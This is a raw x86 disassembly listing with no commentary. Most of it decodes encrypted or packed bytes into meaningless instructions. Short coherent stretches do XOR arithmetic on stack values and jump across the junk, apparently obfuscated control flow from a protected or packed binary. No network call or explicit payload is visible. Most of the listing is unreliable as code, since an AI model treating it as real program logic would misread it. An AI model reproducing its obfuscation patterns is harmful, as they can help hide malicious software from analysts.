  4020e6:	lock outs dx,BYTE PTR ds:[esi]
  4020e8:	xor    eax,0x6f1596db
  4020ed:	cmp    BYTE PTR [esi+ebx*8],cl
  4020f0:	sub    esp,edx
  4020f2:	fnstenv [eax+0x7e]
  4020f5:	inc    ecx
  4020f6:	fxch   st(3)
  4020f8:	push   ss
  4020f9:	shl    BYTE PTR [ebx+0x1a358f41],0xac
  402100:	sti    
  402101:	mov    al,ds:0x366d7165
  402106:	out    dx,eax
  402107:	leave  
  402108:	xchg   edx,eax
  402109:	ror    cl,0x8
  40210c:	jp     0x4020e3
  40210e:	fmulp  st(4),st
  402110:	ret    0xa1b
  402113:	test   BYTE PTR [ecx-0x74],0xc3
  402117:	pop    edi
  402118:	jbe    0x4020d0
  40211a:	or     bl,ch
  40211c:	jmp    0x4020e3
  40211e:	cmp    DWORD PTR [edi-0xaa9f78c],edi
  402124:	test   al,0xbc
  402126:	dec    esi
  402127:	or     eax,0x322a5f37
  40212c:	(bad)  
  40212d:	(bad)  
  40212e:	jecxz  0x402187
  402130:	adc    DWORD PTR [edx-0x26],0xffffffe8
  402134:	rol    al,cl
  402136:	fwait
  402137:	pop    eax
  402138:	daa    
  402139:	jae    0x4020c6
  40213b:	ins    DWORD PTR es:[edi],dx
  40213c:	jp     0x4021a9
  40213e:	push   edi
  40213f:	shr    BYTE PTR [esi],1
  402141:	pusha  
  402142:	inc    esp
  402143:	push   cs
  402144:	dec    edx
  402145:	cmp    BYTE PTR [ecx+ecx*1+0xc8082e9],ch
  40214c:	and    eax,0x7579af2c
  402151:	mov    bl,0xda
  402153:	test   eax,0x326792
  402158:	fbld   TBYTE PTR [esi-0x1eaa182d]
  40215e:	arpl   si,si
  402160:	dec    ecx
  402161:	pop    edi
  402162:	and    BYTE PTR [ecx-0x34c3a9ca],cl
  402168:	in     al,0x23
  40216a:	sbb    dh,BYTE PTR [ebx]
  40216c:	sub    dh,BYTE PTR [ebp+0x279e7041]
  402172:	mov    al,0x41
  402174:	dec    ebx
  402175:	aam    0xa8
  402177:	bound  esp,QWORD PTR [eax+eiz*8-0x5250b148]
  40217e:	jp     0x40219e
  402180:	(bad)  
  402181:	cmp    eax,0xc958835b
  402186:	inc    ebx
  402187:	fucomp st(7)
  402189:	fisttp WORD PTR [bx+0x33af]
  40218e:	fmul   st(2),st
  402190:	imul   ecx,DWORD PTR [edx+0x9],0xfc017ec3
  402197:	js     0x402212
  402199:	mov    bh,0xde
  40219b:	fdiv   st(3),st
  40219d:	adc    esp,DWORD PTR [edx]
  40219f:	aaa    
  4021a0:	(bad)  
  4021a2:	addr16 xchg ebp,eax
  4021a4:	mov    eax,ds:0x33911d59
  4021a9:	lds    esi,FWORD PTR [edi-0x6c]
  4021ac:	mov    al,0x73
  4021ae:	jmp    0x90415ecd
  4021b3:	xchg   DWORD PTR [eax-0x2b],ebp
  4021b6:	mov    ds:0xa278b9dd,eax
  4021bc:	sbb    al,0x8e
  4021be:	stc    
  4021bf:	enter  0xfe21,0x9a
  4021c3:	test   DWORD PTR [edi+0x5e9a8832],ebx
  4021c9:	xchg   esi,eax
  4021ca:	pop    ds
  4021cb:	out    0xa7,al
  4021cd:	push   edx
  4021ce:	xchg   edx,eax
  4021cf:	mov    edx,0x76de76c1
  4021d4:	sub    al,0x17
  4021d6:	daa    
  4021d7:	out    dx,al
  4021d8:	ffreep st(7)
  4021da:	in     eax,dx
  4021db:	cmc    
  4021dc:	jno    0x402187
  4021de:	pop    esp
  4021df:	cmp    ch,BYTE PTR [ebx+ebp*1+0x2a]
  4021e3:	ja     0x402211
  4021e5:	or     dl,BYTE PTR [ecx-0x6940e71a]
  4021eb:	ds scas al,BYTE PTR es:[edi]
  4021ed:	dec    edx
  4021ee:	dec    ebp
  4021ef:	mov    bl,0x2b
  4021f1:	sub    BYTE PTR [ecx-0x56],ah
  4021f4:	push   edx
  4021f5:	scas   al,BYTE PTR es:[edi]
  4021f6:	jle    0x40219a
  4021f8:	xchg   ebx,eax
  4021f9:	push   ebp
  4021fa:	push   ecx
  4021fb:	cmp    BYTE PTR [esi+eax*1],bl
  4021fe:	je     0x40220c
  402200:	in     eax,dx
  402201:	add    al,0xb2
  402203:	mov    ch,0x27
  402205:	out    0x93,eax
  402207:	and    edi,DWORD PTR [esi]
  402209:	adc    eax,0xe8c83eab
  40220e:	cld    
  40220f:	mov    bl,0x7
  402211:	jnp    0x4021a8
  402213:	in     eax,dx
  402214:	jmp    0xe789:0x194a5f15
  40221b:	in     eax,dx
  40221c:	xchg   esp,eax
  40221d:	bound  ecx,QWORD PTR [ecx]
  40221f:	and    ebp,esi
  402221:	clc    
  402222:	pusha  
  402223:	retf   
  402224:	mov    dh,0x24
  402226:	bound  edx,QWORD PTR [edx]
  402228:	dec    ebx
  402229:	aam    0x40
  40222b:	pop    esi
  40222c:	pop    edi
  40222d:	or     al,0x91
  40222f:	cdq    
  402230:	pop    esi
  402231:	or     bl,BYTE PTR [eax+0x5d]
  402234:	or     al,0xc
  402236:	les    ecx,FWORD PTR [edx]
  402238:	push   esi
  402239:	dec    ecx
  40223a:	std    
  40223b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40223c:	push   esp
  40223d:	jmp    0x4021d2
  40223f:	mov    dl,0x56
  402241:	aas    
  402242:	sub    al,0xd
  402244:	fsubrp st(0),st
  402246:	cmc    
  402247:	popa   
  402248:	pusha  
  402249:	test   DWORD PTR [edi+0x3374ab6e],edi
  40224f:	fwait
  402250:	sar    DWORD PTR [ebx+0x10bdc472],1
  402256:	add    DWORD PTR [edi+ecx*8-0x5d0b74fe],ebp
  40225d:	into   
  40225e:	pop    ds
  40225f:	lods   eax,DWORD PTR ds:[esi]
  402260:	inc    edx
  402261:	sahf   
  402262:	xchg   edx,eax
  402263:	nop    DWORD PTR [edi+0x7475d683]
  40226a:	mov    edx,0x7f03e2c7
  40226f:	rol    BYTE PTR [esi+0x1ee7ceee],0xaa
  402276:	je     0x4026fd
  40227c:	mov    eax,DWORD PTR [ebp-0x14]
  40227f:	xor    eax,ecx
  402281:	add    eax,esi
  402283:	mov    DWORD PTR [ebp-0x30],eax
  402286:	mov    eax,DWORD PTR [ebp-0x34]
  402289:	jmp    0x4024a6
  40228e:	jp     0x40222b
  402290:	sbb    al,0xe8
  402292:	cdq    
  402293:	ja     0x402267
  402295:	jno    0x40227a
  402297:	sbb    al,0x20
  402299:	sub    DWORD PTR [edi-0x27],edx
  40229c:	sti    
  40229d:	fnsave [eax+0x2]
  4022a0:	jo     0x402312
  4022a2:	jo     0x402322
  4022a4:	jo     0x402316
  4022a6:	push   cs
  4022a7:	fistp  QWORD PTR [edi+0x774bd5cb]
  4022ad:	push   ss
  4022ae:	inc    esi
  4022af:	jo     0x4022e4
  4022b1:	mov    esi,0x108c5b6c
  4022b6:	icebp  
  4022b7:	inc    ebx
  4022b8:	cmc    
  4022b9:	scas   eax,DWORD PTR es:[edi]
  4022ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022bb:	sub    BYTE PTR [ecx-0x2300a1b6],cl
  4022c1:	test   BYTE PTR [edi],ch
  4022c3:	loope  0x402324
  4022c5:	and    eax,0x6d3516bf
  4022ca:	rcr    BYTE PTR [eax+edi*1+0x37cc4ba3],0x75
  4022d2:	(bad)  
  4022d3:	outs   dx,DWORD PTR ds:[esi]
  4022d4:	and    ebp,DWORD PTR [eax+ebp*4+0x75754965]
  4022db:	loopne 0x402351
  4022dd:	push   es
  4022de:	sub    ah,0x37
  4022e1:	into   
  4022e2:	int    0xf8
  4022e4:	mov    eax,0xaa9603c7
  4022e9:	cdq    
  4022ea:	push   ss
  4022eb:	mov    ch,BYTE PTR ds:0x465b72b2
  4022f1:	push   0xd31f8f1e
  4022f6:	or     ebx,ebp
  4022f8:	inc    ebp
  4022f9:	fcomi  st,st(2)
  4022fb:	jle    0x402299
  4022fd:	ja     0x402375
  4022ff:	xor    al,0xe0
  402301:	fbld   TBYTE PTR [edx+0x60]
  402304:	enter  0xa74d,0x7e
  402308:	addr16 dec edx
  40230a:	pop    es
  40230b:	daa    
  40230c:	dec    edi
  40230d:	mov    eax,ds:0xea81ed40
  402312:	popf   
  402313:	xor    BYTE PTR [edi-0x232c84ad],bh
  402319:	in     eax,0xad
  40231b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40231c:	ds je  0x4022b0
  40231f:	mov    bh,0x88
  402321:	sbb    ebp,DWORD PTR [esi+0x1d]
  402324:	stos   BYTE PTR es:[edi],al
  402325:	push   eax
  402326:	js     0x402335
  402328:	adc    BYTE PTR [ebp-0x57bca85f],al
  40232e:	pop    ebx
  40232f:	sar    DWORD PTR [edx+eax*8-0x328b13f7],0x2c
  402337:	ins    DWORD PTR es:[edi],dx
  402338:	or     edx,DWORD PTR [ecx]
  40233a:	jne    0x4023a3
  40233c:	mov    esi,0x5ef529ba
  402341:	out    0x41,al
  402343:	aaa    
  402344:	push   eax
  402345:	fwait
  402346:	ror    BYTE PTR [edi+edi*4+0x2e],0xa9
  40234b:	shl    BYTE PTR [ebp-0x22],0x7
  40234f:	mov    ebx,0x696dc4f6
  402354:	test   DWORD PTR [ebp-0x65],esp
  402357:	sbb    eax,0x67fe63b3
  40235c:	sub    BYTE PTR [eax+0x1ffac62a],bh
  402362:	jo     0x4023a7
  402364:	in     eax,0x54
  402366:	pop    ebp
  402367:	adc    esp,edi
  402369:	inc    edx
  40236a:	(bad)  
  40236b:	xchg   ebx,eax
  40236c:	lods   al,BYTE PTR ds:[esi]
  40236d:	sbb    al,0xcf
  40236f:	retf   0x4730
  402372:	in     al,0x4b
  402374:	dec    ebp
  402375:	or     eax,0x8194c016
  40237a:	retf   
  40237b:	or     BYTE PTR [ecx+0x16],ah
  40237e:	nop
  40237f:	aam    0x80
  402381:	jg     0x4023ec
  402383:	xchg   edx,eax
  402384:	or     ebx,esp
  402386:	xchg   ecx,eax
  402387:	pusha  
  402388:	add    BYTE PTR [edi+0x15],cl
  40238b:	fcomp  QWORD PTR [edx+0x27a1b205]
  402391:	xor    esi,DWORD PTR [eax+0x6b]
  402394:	pop    ebx
  402395:	fbld   TBYTE PTR [eax+edx*4]
  402398:	enter  0xc0ae,0xae
  40239c:	jno    0x402390
  40239e:	dec    ecx
  40239f:	jne    0x4023aa
  4023a1:	inc    edx
  4023a2:	cmp    al,0x97
  4023a4:	and    al,bl
  4023a6:	dec    esp
  4023a7:	mov    bl,0x27
  4023a9:	sub    BYTE PTR [edi],al
  4023ab:	push   edi
  4023ac:	int3   
  4023ad:	cld    
  4023ae:	dec    ecx
  4023af:	inc    esp
  4023b0:	in     eax,dx
  4023b1:	push   edi
  4023b2:	mov    esi,ebx
  4023b4:	jo     0x4023cc
  4023b6:	out    0x5,eax
  4023b8:	xchg   edx,eax
  4023b9:	lods   eax,DWORD PTR ds:[esi]
  4023ba:	(bad)  
  4023bb:	dec    edi
  4023bc:	xchg   ecx,eax
  4023bd:	loopne 0x4023ee
  4023bf:	jbe    0x402396
  4023c1:	adc    BYTE PTR [esi],0xe3
  4023c4:	rcl    edi,cl
  4023c6:	dec    edx
  4023c7:	jo     0x40243b
  4023c9:	cdq    
  4023ca:	or     DWORD PTR [ecx],edi
  4023cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023cd:	nop
  4023ce:	scas   al,BYTE PTR es:[edi]
  4023cf:	call   0xaa374da3
  4023d4:	jae    0x7a3c5662
  4023da:	or     bh,BYTE PTR [ecx]
  4023dc:	mov    ss,WORD PTR [esi-0x6523aea5]
  4023e2:	and    BYTE PTR [edx],0xc5
  4023e5:	sbb    dl,bl
  4023e7:	js     0x4023ac
  4023e9:	mov    eax,0xf3a087a3
  4023ee:	xchg   edi,eax
  4023ef:	push   ebp
  4023f0:	fild   QWORD PTR [esp+eax*1+0x6a2479d]
  4023f7:	and    al,BYTE PTR [ebx-0x1c3f247]
  4023fd:	xlat   BYTE PTR ds:[ebx]
  4023fe:	sar    DWORD PTR [ecx+0x46955b3e],1
  402404:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402405:	into   
  402406:	fwait
  402407:	bound  edi,QWORD PTR [edi-0x56]
  40240a:	mov    ah,0x46
  40240c:	movaps xmm3,XMMWORD PTR [ebp+eax*4-0x411e8b04]
  402414:	inc    ecx
  402415:	xor    DWORD PTR [esi],esi
  402417:	repz pop es
  402419:	cmp    BYTE PTR [edi+0x359c7b1f],bh
  40241f:	sub    BYTE PTR [esi-0x1d],ch
  402422:	cmp    eax,0xe6c19186
  402427:	sbb    eax,0xaf799f4a
  40242c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40242d:	les    edi,FWORD PTR [esi+ebx*1]
  402430:	mov    bl,0x43
  402432:	test   eax,0x71fa3113
  402437:	daa    
  402438:	rcl    BYTE PTR [edi+0x35],1
  40243b:	xor    al,0xfe
  40243d:	jo     0x40240e
  40243f:	rcl    BYTE PTR cs:[eax],0x9e
  402443:	add    al,0x0
  402445:	adc    al,0x3d
  402447:	or     edi,DWORD PTR [edi]
  402449:	inc    edi
  40244a:	add    dh,BYTE PTR [edi-0x2b650207]
  402450:	push   0xde8bced4
  402455:	sub    eax,DWORD PTR [esi-0x68]
  402458:	push   ebx
  402459:	popa   
  40245a:	div    dh
  40245c:	jae    0x402400
  40245e:	cmc    
  40245f:	scas   al,BYTE PTR es:[edi]
  402460:	or     ah,cl
  402462:	test   esp,0x212e7f9d
  402468:	dec    ecx
  402469:	sub    eax,0x1f60992f
  40246e:	aaa    
  40246f:	nop
  402470:	add    al,0xbd
  402472:	jmp    0xebba0a30
  402477:	in     al,dx
  402478:	pop    edx
  402479:	dec    eax
  40247a:	shr    DWORD PTR [esi],0x2f
  40247d:	cmp    eax,0x118a48f8
  402482:	and    ebp,DWORD PTR [esi-0x39bea792]
  402488:	push   eax
  402489:	push   ds
  40248a:	(bad)  
  40248b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40248c:	call   0x2ca:0x986d5ac8
  402493:	or     DWORD PTR [edi+0x6ecd835],ecx
  402499:	in     al,0xd9
  40249b:	push   0xffffffde
  40249d:	push   es
  40249e:	fsub   QWORD PTR [edi+0x39]
  4024a1:	mov    bh,0xea
  4024a3:	fldl2t 
  4024a5:	adc    al,0x66
  4024a7:	mov    edx,DWORD PTR [ebp-0x38]
  4024aa:	mov    ebx,0x8a3e
  4024af:	xor    dx,bx
  4024b2:	mov    ebx,DWORD PTR [ebp-0x8]
  4024b5:	add    dx,di
  4024b8:	movzx  edx,dx
  4024bb:	xor    ebx,ecx
  4024bd:	lea    edx,[edx+ebx*1+0x32729c]
  4024c4:	add    DWORD PTR [eax],edx
  4024c6:	mov    eax,DWORD PTR [ebp-0x2c]
  4024c9:	mov    edx,DWORD PTR [ebp-0x8]
  4024cc:	mov    ebx,DWORD PTR [ebp-0x30]
  4024cf:	xor    edx,ecx
  4024d1:	add    edx,esi
  4024d3:	imul   edx,ebx
  4024d6:	sub    DWORD PTR [eax],edx
  4024d8:	mov    eax,DWORD PTR [ebp-0x14]
  4024db:	jmp    0x402730
  4024e0:	jmp    0x4026fd
  4024e5:	and    DWORD PTR [edi+edi*4+0x31714d76],esi
  4024ec:	jae    0x40250e
  4024ee:	xor    BYTE PTR [ecx-0x350d68c9],cl
  4024f4:	push   edi
  4024f5:	jo     0x4024f7
  4024f7:	jo     0x402569
  4024f9:	jo     0x402579
  4024fb:	jo     0x40256d
  4024fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024fe:	retf   0x9ba4
  402501:	ins    DWORD PTR es:[edi],dx
  402502:	mov    ebp,0xce7e37b7
  402507:	ins    BYTE PTR es:[edi],dx
  402508:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402509:	pop    ecx
  40250a:	mov    esi,0xa2952d7d
  40250f:	pop    ecx
  402510:	dec    esi
  402511:	sub    edi,DWORD PTR [eax]
  402513:	shl    BYTE PTR [ebx-0x1b75da2e],0xae
  40251a:	jns    0x402567
  40251c:	jecxz  0x402513
  40251e:	fmul   DWORD PTR [ecx+0x8]
  402521:	in     al,dx
  402522:	inc    ebp
  402523:	int    0x1f
  402525:	mov    dh,0xa1
  402527:	cmp    DWORD PTR [ecx+eax*2-0x3e],esp
  40252b:	add    DWORD PTR [ebx+0x37],edx
  40252e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40252f:	add    esi,DWORD PTR [ebx-0x52f985d5]
  402535:	rol    DWORD PTR [eax+0x76643d8e],cl
  40253b:	js     0x402517
  40253d:	xor    al,0xc2
  40253f:	jp     0x4025b3
  402541:	push   ebx
  402542:	loopne 0x40254e
  402544:	jb     0x4024f9
  402546:	lods   eax,DWORD PTR ds:[esi]
  402547:	leave  
  402548:	mov    ?,WORD PTR [eax+eax*1]
  40254b:	lds    ebp,FWORD PTR [edx+edx*4+0x2a6ad409]
  402552:	and    edx,DWORD PTR [edx-0x70c792a4]
  402558:	shl    DWORD PTR [edx-0x230f5ee9],cl
  40255e:	jecxz  0x402511
  402560:	outs   dx,BYTE PTR ds:[esi]
  402561:	jno    0x4025d1
  402563:	test   al,cl
  402565:	je     0x4025e6
  402567:	aam    0xd3
  402569:	push   cs
  40256a:	imul   edi,edx,0x7a
  40256d:	pushf  
  40256e:	inc    edx
  40256f:	int    0x54
  402571:	mov    ?,WORD PTR [esi-0x4a]
  402574:	cmp    ch,BYTE PTR [edi-0x1a]
  402577:	pop    ebp
  402578:	and    edx,DWORD PTR [ebp+0x57362024]
  40257e:	bound  ecx,QWORD PTR [esi]
  402580:	or     eax,0x30bc074e
  402585:	pusha  
  402586:	into   
  402587:	test   eax,0x8dd8c33
  40258c:	inc    esi
  40258d:	sbb    al,0x34
  40258f:	loope  0x40252c
  402591:	cmp    DWORD PTR [ebx+0x28],edi
  402594:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402595:	inc    esi
  402596:	and    ecx,0x24
  402599:	fidiv  DWORD PTR [ebp-0x66d63a63]
  40259f:	xchg   edi,eax
  4025a0:	int3   
  4025a1:	std    
  4025a2:	fstp   DWORD PTR [eax-0x55]
  4025a5:	adc    ebp,0x571e62b1
  4025ab:	sbb    ah,ch
  4025ad:	or     eax,0x813f0883
  4025b2:	mov    ds:0xe99345e2,eax
  4025b7:	push   ecx
  4025b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025b9:	pop    esp
  4025ba:	and    ch,BYTE PTR ds:[eax-0x18]
  4025be:	mov    edi,0xb4ee1099
  4025c3:	inc    ebx
  4025c4:	out    dx,al
  4025c5:	xchg   cx,ax
  4025c7:	or     ch,BYTE PTR [edi+0x37]
  4025ca:	scas   al,BYTE PTR es:[edi]
  4025cb:	push   cs
  4025cc:	pop    edx
  4025cd:	js     0x4025f9
  4025cf:	push   cs
  4025d0:	call   0xbccb:0xcade927a
  4025d7:	sbb    BYTE PTR [edx+0x5d],dl
  4025da:	in     al,0xfa
  4025dc:	jecxz  0x402588
  4025de:	mov    al,0xe0
  4025e0:	inc    edi
  4025e1:	push   ecx
  4025e2:	push   eax
  4025e3:	mov    esp,0xf1cc6b5a
  4025e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025e9:	xor    DWORD PTR [eax-0x1a],ebp
  4025ec:	dec    ecx
  4025ed:	scas   eax,DWORD PTR es:[edi]
  4025ee:	sbb    DWORD PTR [bx+si],eax
  4025f1:	sub    eax,0xd18d039f
  4025f6:	lods   al,BYTE PTR ds:[esi]
  4025f7:	mov    cl,0xdf
  4025f9:	ret    
  4025fa:	and    BYTE PTR [eax-0x76],ah
  4025fd:	adc    DWORD PTR [ecx+0x2634c945],esp
  402603:	xor    ebx,DWORD PTR [ecx-0x60]
  402606:	test   ebx,ebx
  402608:	dec    edx
  402609:	mov    eax,0x2d98ee28
  40260e:	(bad)  
  40260f:	mov    dh,0x67
  402611:	mov    BYTE PTR [eax-0x2a],ch
  402614:	sub    al,BYTE PTR [edx-0x77]
  402617:	pushf  
  402618:	inc    edi
  402619:	mov    edx,ebp
  40261b:	sahf   
  40261c:	cmp    al,BYTE PTR [edi-0x17b247e2]
  402622:	push   cs
  402623:	cmc    
  402624:	outs   dx,DWORD PTR ss:[esi]
  402626:	xchg   ebp,eax
  402627:	aas    
  402628:	sub    bh,BYTE PTR [edi+0x4462aa36]
  40262e:	test   al,0x7
  402630:	jae    0x4025f0
  402632:	sahf   
  402633:	call   0x7221:0x19f80c3c
  40263a:	arpl   sp,cx
  40263c:	shl    DWORD PTR [eax+edi*1],0x54
  402640:	add    ecx,DWORD PTR [ebp+0x6f]
  402643:	or     al,0xf4
  402645:	pop    edi
  402646:	cli    
  402647:	jns    0x40267d
  402649:	ret    0xf967
  40264c:	sub    eax,0x7c0e9e81
  402651:	in     eax,0x6
  402653:	lods   eax,DWORD PTR ds:[esi]
  402654:	mov    al,0x52
  402656:	xor    ebp,DWORD PTR [edx+ebx*4]
  402659:	out    0x88,al
  40265b:	nop
  40265c:	xor    DWORD PTR [ecx],0x1238b10b
  402662:	ins    DWORD PTR es:[edi],dx
  402663:	pop    edi
  402664:	in     al,dx
  402665:	push   ebp
  402666:	ret    0xf0df
  402669:	ds call 0x1455:0x65580283
  402671:	push   ebx
  402672:	push   ebp
  402673:	bound  eax,QWORD PTR [eax+0x5c7cd9b2]
  402679:	or     BYTE PTR [edx+esi*2+0x36],ch
  40267d:	les    esp,FWORD PTR [edx+ebx*2]
  402680:	lods   eax,DWORD PTR ds:[esi]
  402681:	lods   al,BYTE PTR ds:[esi]
  402682:	xchg   edi,eax
  402683:	fist   DWORD PTR [ebx+ebx*8]
  402686:	jb     0x402685
  402688:	stc    
  402689:	lds    esp,FWORD PTR gs:[eax+0x77]
  40268d:	sub    dl,0x68
  402690:	sub    DWORD PTR [edx],ebx
  402692:	fs out dx,al
  402694:	icebp  
  402695:	pop    ebx
  402696:	pop    esi
  402697:	sub    DWORD PTR [ebx+0x30],ebx
  40269a:	cli    
  40269b:	nop
  40269c:	dec    ebx
  40269d:	mov    al,ds:0x5d2e3c0
  4026a2:	das    
  4026a3:	stos   DWORD PTR es:[edi],eax
  4026a4:	xchg   esi,eax
  4026a5:	faddp  st(7),st
  4026a7:	mov    esp,0x928eb62e
  4026ac:	scas   al,BYTE PTR es:[edi]
  4026ad:	dec    dx
  4026af:	add    al,0xd8
  4026b1:	or     eax,0x97500fd8
  4026b6:	fwait
  4026b7:	(bad)  
  4026b8:	xor    DWORD PTR [ebx-0x32fd4e0a],esi
  4026be:	dec    ebx
  4026bf:	sbb    ch,BYTE PTR [ebx+0x4c]
  4026c2:	push   0x6a
  4026c4:	add    eax,0xa663e759
  4026c9:	xor    al,0x1
  4026cb:	sub    al,0xe8
  4026cd:	sub    BYTE PTR [ecx],ch
  4026cf:	and    eax,0x62a665e1
  4026d4:	call   edi
  4026d6:	ins    BYTE PTR es:[edi],dx
  4026d7:	jae    0x4026af
  4026d9:	cmp    bh,0x6d
  4026dc:	xor    eax,0x9a2eef00
  4026e1:	mov    edx,eax
  4026e3:	add    DWORD PTR [edi-0xa],ebx
  4026e6:	inc    ecx
  4026e7:	icebp  
  4026e8:	pop    edx
  4026e9:	add    bh,BYTE PTR [edx-0x24]
  4026ec:	xor    DWORD PTR [esi+0x8],esi
  4026ef:	call   0xd26:0x772a2061
  4026f6:	jbe    0x4026b2
  4026f8:	pop    ecx
  4026f9:	and    ebp,edi
  4026fb:	out    dx,al
  4026fc:	jae    0x402689
  4026fe:	inc    ebp
  4026ff:	hlt    
  402700:	mov    edx,DWORD PTR [ebp-0x18]
  402703:	xor    eax,edx
  402705:	cmp    eax,0x8cb40b7d
  40270a:	je     0x40272d
  402710:	mov    eax,DWORD PTR [ebp-0x10]
  402713:	add    DWORD PTR [eax],0x7403501
  402719:	jmp    0x40272d
  40271e:	mov    eax,DWORD PTR [ebp-0x1c]
  402721:	cmp    DWORD PTR [eax],0xf89f2da9
  402727:	jne    0x402748
  40272d:	mov    eax,DWORD PTR [ebp-0x8]
  402730:	xor    eax,ecx
  402732:	add    eax,esi
  402734:	test   eax,eax
  402736:	jne    0x402748
  40273c:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  402743:	jmp    0x4012bf
  402748:	pop    ebx
  402749:	pop    edi
  40274a:	jmp    0x402967
  40274f:	cs dec edi
  402751:	add    dl,bl
  402753:	popa   
  402754:	push   ecx
  402755:	in     eax,dx
  402756:	jno    0x4026ea
  402758:	imul   ebx,DWORD PTR [ecx+esi*8],0x584abd3d
  40275f:	jo     0x40276f
  402761:	jo     0x4027d3
  402763:	jo     0x4027e3
  402765:	jo     0x4027d7
  402767:	adc    BYTE PTR [ebp+0x36],al
  40276a:	jno    0x40277d
  40276c:	mov    ds:0x54709e81,eax
  402771:	sub    al,0x38
  402773:	jb     0x402752
  402775:	sub    eax,0x1c4c2f1b
  40277a:	jb     0x402764
  40277c:	xor    dl,ah
  40277e:	je     0x4027b7
  402780:	cwde   
  402781:	stc    
  402782:	js     0x402758
  402784:	mov    edi,0x6eb98913
  402789:	mov    al,0x89
  40278b:	add    ebx,eax
  40278d:	sub    esp,DWORD PTR ds:0xe8836032
  402793:	int3   
  402794:	mov    cl,0xa3
  402796:	cmp    al,0xd8
  402798:	aam    0x97
  40279a:	sbb    DWORD PTR [ebp+0x72],ebp
  40279d:	cmp    ebx,0x50
  4027a0:	adc    ah,BYTE PTR [ebp+0x3ac8e1da]
  4027a6:	mov    ecx,0xef67e66e
  4027ab:	jbe    0x402783
  4027ad:	and    esi,DWORD PTR [edx]
  4027af:	or     al,0x12
  4027b1:	cwde   
  4027b2:	jmp    0x968056e3
  4027b7:	sbb    esi,esi
  4027b9:	pop    es
  4027ba:	mov    esp,edx
  4027bc:	stos   DWORD PTR es:[edi],eax
  4027bd:	mov    dh,0x1d
  4027bf:	std    
  4027c0:	and    ah,0x60
  4027c3:	cmp    al,0x29
  4027c5:	popa   
  4027c6:	aad    0xb9
  4027c8:	cdq    
  4027c9:	mov    DWORD PTR [esi-0x2c],esi
  4027cc:	xchg   ebx,eax
  4027cd:	pop    edx
  4027ce:	mov    esp,0x242bd51
  4027d3:	jmp    DWORD PTR [ebp-0x4f6f0ce2]
  4027d9:	jae    0x402797
  4027db:	xor    esp,0xffffffbb
  4027de:	inc    ebx
  4027df:	dec    ecx
  4027e0:	mov    ah,0x50
  4027e2:	cmp    bl,BYTE PTR [esi]
  4027e4:	pop    ds
  4027e5:	iret   
  4027e6:	(bad)  
  4027e7:	cwde   
  4027e8:	sub    DWORD PTR [ecx],eax
  4027ea:	mov    eax,ds:0xc6f9c2dd
  4027ef:	sub    BYTE PTR [edi-0x17989541],0x5e
  4027f6:	aad    0x9a
  4027f8:	(bad)  
  4027f9:	ss xchg ebp,eax
  4027fb:	(bad)  
  4027fc:	aaa    
  4027fd:	mov    al,0x3f
  4027ff:	fistp  DWORD PTR [edx-0x3]
  402802:	adc    eax,0x6c79f7c8
  402807:	xchg   edx,eax
  402808:	outs   dx,DWORD PTR ds:[esi]
  402809:	sar    BYTE PTR [ecx],1
  40280b:	pop    eax
  40280c:	pop    ebx
  40280d:	and    ah,BYTE PTR [ebp+0x51488e33]
  402813:	or     ebp,DWORD PTR [edx-0x53a53cd3]
  402819:	js     0x4027f6
  40281b:	std    
  40281c:	mov    cl,BYTE PTR [ebp+0x58]
  40281f:	push   ss
  402820:	pushf  
  402821:	sbb    edi,DWORD PTR ds:0x275a7826
  402827:	iret   
  402828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402829:	(bad)  
  40282a:	dec    esi
  40282b:	stc    
  40282c:	push   cs
  40282d:	sbb    cl,ch
  40282f:	or     al,0xe3
  402831:	das    
  402832:	adc    cl,BYTE PTR [esp+edi*1+0x6d1f0c10]
  402839:	pop    es
  40283a:	hlt    
  40283b:	rol    esi,0x3e
  40283e:	mov    ecx,0x85f6d7e8
  402843:	pop    eax
  402844:	mov    bh,0x83
  402846:	push   cs
  402847:	les    ebx,FWORD PTR [edx]
  402849:	push   cs
  40284a:	lods   eax,DWORD PTR ds:[esi]
  40284b:	test   BYTE PTR [ebx+0x6e],cl
  40284e:	sub    bh,BYTE PTR [ebx+0x2e]
  402851:	ret    
  402852:	xchg   esi,eax
  402853:	xchg   ecx,eax
  402854:	sub    ebx,edi
  402856:	mov    cl,0xab
  402858:	sbb    al,0xb7
  40285a:	sahf   
  40285b:	aaa    
  40285c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40285d:	sahf   
  40285e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40285f:	jb     0x4027ec
  402861:	push   cs
  402862:	test   DWORD PTR [ecx+0x5],esi
  402865:	pop    edx
  402866:	push   eax
  402867:	js     0x402880
  402869:	push   ecx
  40286a:	call   FWORD PTR [eax+0x2f]
  40286d:	jmp    0x9748bec5
  402872:	pop    ebx
  402873:	adc    DWORD PTR [edx-0x38],0xffffff92
  402877:	scas   al,BYTE PTR es:[edi]
  402878:	push   ecx
  402879:	out    dx,eax
  40287a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40287b:	pushf  
  40287c:	pop    eax
  40287d:	push   ebp
  40287e:	outs   dx,DWORD PTR ds:[esi]
  40287f:	in     al,dx
  402880:	lea    edx,[ebx-0x4c]
  402883:	clc    
  402884:	sub    al,BYTE PTR [edi-0x2b]
  402887:	xchg   BYTE PTR [edi-0x485b83c7],al
  40288d:	leave  
  40288e:	mov    ebx,0xc312bc6f
  402893:	push   esi
  402894:	push   ds
  402895:	scas   eax,DWORD PTR es:[edi]
  402896:	pop    ds
  402897:	retf   0x15da
